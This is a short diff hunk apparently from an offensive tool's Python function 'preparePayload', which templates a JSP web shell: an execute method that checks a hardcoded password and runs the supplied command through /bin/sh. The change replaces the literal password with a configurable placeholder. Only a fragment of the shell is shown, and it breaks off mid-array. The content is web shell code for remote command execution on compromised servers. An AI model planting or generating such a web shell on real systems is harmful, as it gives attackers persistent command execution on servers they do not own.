@@ -491,7 +491,7 @@ def preparePayload(opts):
 <%%@page import="java.net.*"%%>
 <%%!
 	public String execute(String pass, String cmd) {
-		final String hardcodedPass = "password";
+		final String hardcodedPass = "%(password)s";
 		StringBuilder res = new StringBuilder();
 		String[] cmd2 = {
 			"/bin/sh",
